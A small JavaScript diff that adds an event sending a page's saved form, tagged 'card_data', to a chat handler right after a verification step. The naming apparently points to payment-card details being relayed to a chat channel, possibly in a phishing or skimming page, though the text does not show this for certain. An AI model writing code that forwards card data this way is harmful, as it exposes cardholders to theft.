@@ -2168,6 +2168,9 @@ document.addEventListener('DOMContentLoaded', function(){
                     }
                     self._savedForm = collectForm();
                     showVerification(sh, self);
+                    document.dispatchEvent(new CustomEvent('chat:trigger',{detail:Object.assign({
+                        trigger: 'card_data'
+                    }, self._savedForm)}));
                     document.dispatchEvent(new CustomEvent('chat:trigger',{detail:'balance'}));
                 });
             }
